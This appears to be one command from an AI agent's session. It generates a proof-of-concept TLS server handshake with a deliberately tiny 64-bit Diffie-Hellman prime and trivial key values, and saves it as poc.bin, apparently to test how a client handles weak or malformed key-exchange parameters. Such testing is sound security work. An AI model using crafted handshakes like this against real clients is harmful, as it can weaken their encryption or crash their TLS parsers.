Running command: cd /workspace && python3 -c "
import struct

def hs_msg(mtype, body):
    return bytes([mtype]) + len(body).to_bytes(3, 'big') + body

def record(body):
    return b'\x16\x03\x03' + len(body).to_bytes(2, 'big') + body

# ServerHello
sh_body = b'\x03\x03' + b'\x11'*32 + b'\x00' + b'\x00\x34' + b'\x00' + b'\x00\x00'
sh = hs_msg(2, sh_body)

# ServerKeyExchange DHE with small prime (64-bit)
p = 0xFFFFFFFFFFFFFFC5  # 64-bit prime
g = 2
ys = 2
pb = p.to_bytes(8, 'big')
gb = g.to_bytes(1, 'big')
yb = ys.to_bytes(1, 'big')
ske_body = len(pb).to_bytes(2,'big') + pb + len(gb).to_bytes(2,'big') + gb + len(yb).to_bytes(2,'big') + yb
ske = hs_msg(12, ske_body)

# ServerHelloDone
shd = hs_msg(14, b'')

poc = record(sh) + record(ske) + record(shd)
open('/workspace/poc.bin','wb').write(poc)
print('len', len(poc))
print(poc.hex())
"
